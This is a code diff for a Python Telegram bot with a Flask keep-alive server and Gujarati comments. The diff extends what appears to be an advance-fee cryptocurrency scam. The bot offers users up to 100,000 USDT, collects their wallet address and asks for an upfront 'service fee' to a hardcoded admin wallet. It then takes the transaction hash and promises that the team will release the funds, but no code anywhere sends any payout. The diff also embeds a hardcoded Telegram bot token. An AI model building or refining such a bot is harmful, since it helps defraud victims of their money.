@@ -19,90 +19,151 @@ server = Flask(__name__)
 
 @server.route("/")
 def home():
-    return "Bot is alive and running 24/7!"
+    return "Bot is running 24/7!"
 
 def run_web():
     port = int(os.environ.get("PORT", 8080))
     server.run(host="0.0.0.0", port=port)
 
-# ----------------- TELEGRAM BOT CONFIG -----------------
+# ----------------- CONFIGURATION -----------------
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "9034747442:AAGTyaKiyCjS02QWpo8Bk2ilZUsmP6ghyJc")
-WALLET_ADDRESS = "TBZbn9gnVwg2Jam5YdVgjzDxtRyoEr6DYr"
+ADMIN_WALLET = "TBZbn9gnVwg2Jam5YdVgjzDxtRyoEr6DYr"
 ADMIN_CHAT_ID = os.environ.get("ADMIN_CHAT_ID", None)
 
-AMOUNT, AWAIT_CONFIRM, AWAIT_HASH = range(3)
+# સ્ટેટ્સ
+AMOUNT, RECIPIENT_WALLET, AWAIT_CONFIRM, AWAIT_HASH = range(4)
 
 logging.basicConfig(
     format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
 )
 
+def get_start_over_keyboard():
+    return InlineKeyboardMarkup([[InlineKeyboardButton("🔄 Start Over", callback_data="start_over")]])
+
+# /start કમાન્ડ
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    context.user_data.clear()
     welcome_text = (
         "Welcome!\n\n"
         "Please enter the amount of USDT you require.\n"
-        "• Minimum: 1,000 USDT\n"
-        "• Maximum: 10,000 USDT\n\n"
+        "• Minimum: <b>1,000 USDT</b>\n"
+        "• Maximum: <b>100,000 USDT</b>\n\n"
         "Enter the numeric amount below:"
     )
-    await update.message.reply_text(welcome_text)
+    
+    if update.callback_query:
+        await update.callback_query.answer()
+        await update.callback_query.message.reply_text(
+            welcome_text, parse_mode="HTML", reply_markup=get_start_over_keyboard()
+        )
+    else:
+        await update.message.reply_text(
+            welcome_text, parse_mode="HTML", reply_markup=get_start_over_keyboard()
+        )
     return AMOUNT
 
+# ૧. રકમ સ્વીકારવી ($1,000 થી $100,000)
 async def handle_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = update.message.text.strip().replace(",", "")
+    
     try:
         amount = float(text)
     except ValueError:
-        await update.message.reply_text("Invalid input. Please enter a valid number between 1,000 and 10,000.")
+        await update.message.reply_text(
+            "⚠️ Invalid input. Please enter a valid number between 1,000 and 100,000.",
+            reply_markup=get_start_over_keyboard()
+        )
         return AMOUNT
 
-    if amount < 1000 or amount > 10000:
-        await update.message.reply_text("The amount must be between 1,000 and 10,000 USDT. Please try again:")
+    if amount < 1000 or amount > 100000:
+        await update.message.reply_text(
+            "⚠️ The amount must be between 1,000 and 100,000 USDT. Please try again:",
+            reply_markup=get_start_over_keyboard()
+        )
         return AMOUNT
 
-    fee = amount * 0.10
     context.user_data["requested_amount"] = amount
+
+    prompt_wallet = (
+        f"✅ <b>Requested Amount:</b> {amount:,.2f} USDT\n\n"
+        "Now, please provide your <b>USDT (TRC-20) Wallet Address</b> where you want to receive the funds:"
+    )
+    await update.message.reply_text(
+        prompt_wallet, parse_mode="HTML", reply_markup=get_start_over_keyboard()
+    )
+    return RECIPIENT_WALLET
+
+# ૨. યુઝરનું TRC-20 એડ્રેસ સ્વીકારવું અને ૧% ફી ચૂકવવાનું કહેવું
+async def handle_recipient_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_wallet = update.message.text.strip()
+
+    # TRON એડ્રેસ વેલિડેશન (T થી શરૂ થતું અને 34 અક્ષરનું હોવું જોઈએ)
+    if not (user_wallet.startswith("T") and len(user_wallet) == 34):
+        await update.message.reply_text(
+            "⚠️ Invalid TRC-20 Address format. A TRON address starts with 'T' and is 34 characters long.\n"
+            "Please send your correct USDT (TRC-20) address:",
+            reply_markup=get_start_over_keyboard()
+        )
+        return RECIPIENT_WALLET
+
+    context.user_data["user_wallet"] = user_wallet
+    amount = context.user_data.get("requested_amount", 0)
+    fee = amount * 0.01  # ૧% રકમ
     context.user_data["fee_amount"] = fee
 
-    response_text = (
-        f"<b>Requested Amount:</b> {amount:,.2f} USDT\n"
-        f"<b>Required Deposit (10%):</b> {fee:,.2f} USDT\n\n"
-        f"Please send <b>{fee:,.2f} USDT (TRC-20)</b> to the wallet address below:\n\n"
-        f"<code>{WALLET_ADDRESS}</code>\n\n"
+    payment_text = (
+        f"<b>Order Summary:</b>\n"
+        f"• Payout Amount: <b>{amount:,.2f} USDT</b>\n"
+        f"• Receiving Address: <code>{user_wallet}</code>\n"
+        f"• Service Fee (1%): <b>{fee:,.2f} USDT</b>\n\n"
+        f"Please send <b>{fee:,.2f} USDT (TRC-20)</b> to the deposit address below:\n\n"
+        f"<code>{ADMIN_WALLET}</code>\n\n"
         "<i>(Tap the address above to copy)</i>\n\n"
-        "After completing the transfer, click the button below to confirm."
+        "Once payment is completed, click <b>✅ I Have Paid</b> below:"
     )
 
-    keyboard = [[InlineKeyboardButton("✅ I Have Paid", callback_data="paid_confirm")]]
+    keyboard = [
+        [InlineKeyboardButton("✅ I Have Paid", callback_data="paid_confirm")],
+        [InlineKeyboardButton("🔄 Start Over", callback_data="start_over")]
+    ]
     reply_markup = InlineKeyboardMarkup(keyboard)
 
-    await update.message.reply_text(response_text, parse_mode="HTML", reply_markup=reply_markup)
+    await update.message.reply_text(payment_text, parse_mode="HTML", reply_markup=reply_markup)
     return AWAIT_CONFIRM
 
+# ૩. બટન ક્લિક હેન્ડલ કરવું
 async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
 
     if query.data == "paid_confirm":
-        await query.edit_message_reply_markup(reply_markup=None)
         await query.message.reply_text(
-            "Please submit your <b>Transaction Hash (TxID)</b> below:",
-            parse_mode="HTML"
+            "Please enter the <b>Transaction Hash (TxID)</b> of your payment:",
+            parse_mode="HTML",
+            reply_markup=get_start_over_keyboard()
         )
         return AWAIT_HASH
 
+    elif query.data == "start_over":
+        return await start(update, context)
+
+# ૪. ટ્રાન્ઝેક્શન હેશ સ્વીકારવી અને સબમિટ કરવું
 async def handle_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
     tx_hash = update.message.text.strip()
     user = update.effective_user
     requested = context.user_data.get("requested_amount", 0)
     fee = context.user_data.get("fee_amount", 0)
+    user_wallet = context.user_data.get("user_wallet", "N/A")
 
     if len(tx_hash) != 64:
         await update.message.reply_text(
             "⚠️ Invalid Transaction Hash format. A standard TRON TxID is 64 characters long.\n"
-            "Please check and send the correct hash:"
+            "Please check and send the correct hash:",
+            reply_markup=get_start_over_keyboard()
         )
         return AWAIT_HASH
 
+    # ઓન-ચેઇન સ્ટેટસ ચેક (TronScan API)
     status_note = "Pending Verification"
     try:
         url = f"https://apilist.tronscanapi.com/api/transaction-info?hash={tx_hash}"
@@ -114,57 +175,86 @@ async def handle_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
         pass
 
     success_text = (
-        "<b>Your request has been successfully submitted!</b>\n\n"
-        f"<b>Requested:</b> {requested:,.2f} USDT\n"
-        f"<b>Deposit:</b> {fee:,.2f} USDT\n"
-        f"<b>TxID:</b> <code>{tx_hash}</code>\n\n"
-        "Our team will verify the blockchain confirmation and process your request shortly."
+        "🎉 <b>Your request has been successfully submitted!</b>\n\n"
+        f"• <b>Requested:</b> {requested:,.2f} USDT\n"
+        f"• <b>Your Receiving Wallet:</b> <code>{user_wallet}</code>\n"
+        f"• <b>1% Fee Paid:</b> {fee:,.2f} USDT\n"
+        f"• <b>TxID:</b> <code>{tx_hash}</code>\n\n"
+        "Our team will verify the payment and release your funds shortly."
     )
-    await update.message.reply_text(success_text, parse_mode="HTML")
+
+    keyboard = [[InlineKeyboardButton("🔄 Start Over", callback_data="start_over")]]
+    await update.message.reply_text(
+        success_text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard)
+    )
 
     logging.info(
-        f"NEW SUBMISSION | User: @{user.username} (ID: {user.id}) | "
-        f"Req: {requested} USDT | Fee: {fee} USDT | Tx: {tx_hash} | Status: {status_note}"
+        f"NEW ORDER | User: @{user.username} ({user.id}) | Req: {requested} | To: {user_wallet} | Fee: {fee} | Tx: {tx_hash}"
     )
 
+    # એડમિન એલર્ટ
     if ADMIN_CHAT_ID:
         admin_text = (
-            f"🔔 <b>New Request Submitted</b>\n\n"
+            f"🔔 <b>New Payout Order Submitted</b>\n\n"
             f"<b>User:</b> @{user.username} (ID: <code>{user.id}</code>)\n"
             f"<b>Requested USDT:</b> {requested:,.2f}\n"
-            f"<b>Expected 10%:</b> {fee:,.2f} USDT\n"
+            f"<b>Client TRC-20 Wallet:</b> <code>{user_wallet}</code>\n"
+            f"<b>1% Fee:</b> {fee:,.2f} USDT\n"
             f"<b>TxID:</b> <code>{tx_hash}</code>\n"
+            f"<b>Status:</b> {status_note}\n"
             f"<b>Tronscan:</b> https://tronscan.org/#/transaction/{tx_hash}"
         )
         try:
             await context.bot.send_message(chat_id=int(ADMIN_CHAT_ID), text=admin_text, parse_mode="HTML")
         except Exception as e:
-            logging.error(f"Admin alert failed: {e}")
+            logging.error(f"Admin message error: {e}")
 
     context.user_data.clear()
     return ConversationHandler.END
 
+# કેન્સલ કમાન્ડ
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data.clear()
-    await update.message.reply_text("Process cancelled. Send /start to begin again.")
+    await update.message.reply_text(
+        "Process cancelled. Send /start to begin again.",
+        reply_markup=get_start_over_keyboard()
+    )
     return ConversationHandler.END
 
 def run_bot():
     app = ApplicationBuilder().token(BOT_TOKEN).build()
+
     conv_handler = ConversationHandler(
-        entry_points=[CommandHandler("start", start)],
+        entry_points=[
+            CommandHandler("start", start),
+            CallbackQueryHandler(button_callback, pattern="^start_over$")
+        ],
         states={
-            AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_amount)],
-            AWAIT_CONFIRM: [CallbackQueryHandler(button_callback)],
-            AWAIT_HASH: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_hash)],
+            AMOUNT: [
+                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_amount),
+                CallbackQueryHandler(button_callback, pattern="^start_over$")
+            ],
+            RECIPIENT_WALLET: [
+                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_recipient_wallet),
+                CallbackQueryHandler(button_callback, pattern="^start_over$")
+            ],
+            AWAIT_CONFIRM: [
+                CallbackQueryHandler(button_callback)
+            ],
+            AWAIT_HASH: [
+                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_hash),
+                CallbackQueryHandler(button_callback, pattern="^start_over$")
+            ],
         },
-        fallbacks=[CommandHandler("cancel", cancel)],
+        fallbacks=[
+            CommandHandler("cancel", cancel),
+            CallbackQueryHandler(button_callback, pattern="^start_over$")
+        ],
     )
+
     app.add_handler(conv_handler)
     app.run_polling()
 
 if __name__ == "__main__":
-    # Flask સર્વર અલગ થ્રેડમાં ચાલુ કરવું
     threading.Thread(target=run_web, daemon=True).start()
-    # બોટ શરૂ કરવો
     run_bot()
